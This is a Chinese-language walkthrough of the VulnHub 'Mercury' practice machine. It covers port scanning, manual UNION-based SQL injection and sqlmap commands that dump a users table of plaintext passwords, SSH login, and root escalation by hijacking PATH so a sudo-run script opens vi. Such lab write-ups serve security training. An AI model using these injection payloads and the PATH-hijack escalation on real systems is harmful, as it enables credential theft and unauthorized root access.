## 靶机信息
靶机地址:https://download.vulnhub.com/theplanets/Mercury.ova
级别:容易

- VMware17打开靶机会存在兼容性问题，更改硬件兼容性为VMware16.X即可
- IP扫描不到,按shift e修改ro 为 rw sgnie init=/bin/bash Ctrl+ x重启，修改网卡即可
-  lsb_release -a //查看发行版 vi /etc/netplan/00-installer-config.yaml 修改网卡名后重启靶机即可
## Recon
Nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.141

sudo nmap -sT --min-rate 10000 -p- 192.168.1.141
//Ports:
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

sudo nmap -sU --min-rate 10000 --top-ports 20 192.168.1.141 | grep open
69/udp    open|filtered tftp
```

## Web
![[Pasted image 20231007132737.png]]

## 目录爆破
```shell
dirb http://192.168.1.141:8080

---- Scanning URL: http://192.168.1.141:8080/ ----
+ http://192.168.1.141:8080/robots.txt (CODE:200|SIZE:26)
```
查看robots.txt文件
![[Pasted image 20231007133002.png]]
此时robtos.txt没有可以用信息，随便输入一个地址试着报错，报错回显了一个目录。

![[Pasted image 20231007134437.png]]

![[Pasted image 20231007134658.png]]
点击Load a fact
![[Pasted image 20231007134728.png]]
这里很可能存在SQL查询，尝试故意报错。
![[Pasted image 20231007134831.png]]
确实存在SQL注入.

## 手工SQL注入
![[Pasted image 20231007135317.png]]
报错页面中看到了执行的sql语句

```SQL
1 order by 2 -- ' //order by 2时报错。则列数为1
1 union select version() -- ' //Fact id: 1 union select version() -- '. (('Mercury does not have any moons or rings.',), ('8.0.21-0ubuntu0.20.04.4',)) 得到版本信息为:8.0.21-0ubuntu0.20.04.4

//database()
1 union select database() -- '
('mercury',))
//查看当前数据库所有表
1 union select table_name from information_schema.tables where table_schema="mercury" -- ' 
//('facts',), ('users',)

//查看user表字段名
1 union select column_name from information_schema.columns where table_schema="mercury" and table_name='users' -- '.
//('id',), ('password',), ('username',)

//查看username和password
1 union select username from users -- '
//('john',), ('laura',), ('sam',), ('webmaster',)
1 union select password from users -- '
//('johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',)
```
## SqlMap

```shell
sqlmap -u http://192.168.1.141:8080/mercuryfacts/ --dbs --batch
[17:04:55] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[17:04:56] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

//得到两个数据库

//爆表
sqlmap -u http://192.168.1.141:8080/mercuryfacts/ -D mercury --tables --batch
//得到两个数据表
[2 tables]
+-------+
| facts |
| users |
+-------+

//爆字段
sqlmap -u http://192.168.1.141:8080/mercuryfacts/ -D mercury -T users --columns --batch
//
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

//dump
sqlmap -u http://192.168.1.141:8080/mercuryfacts/ -D mercury -T users --dump --batch
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

## 提权

```shell
ssh webmaster@192.168.1.141 //只有webmaster用户可以ssh登录
```
home目录下得到user flag
```shell
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```
/home/webmaster/mercury_proj 目录下找到notes.txt
```shell
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```
base64解码，得到linuxmaster的密码
```shell
linuxmaster:mercurymeandiameteris4880km
```
登录linuxmaster账户
```shell
sudo -l
```
![[Pasted image 20231007174056.png]]
```shell
cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
//看到sudo执行tail命令

ln -s /bin/vi tail
export PATH=.:$PATH
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
//此时会打开vi,命令模式输出:shell即可
root flag:[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```

	![[Pasted image 20231007174817.png]]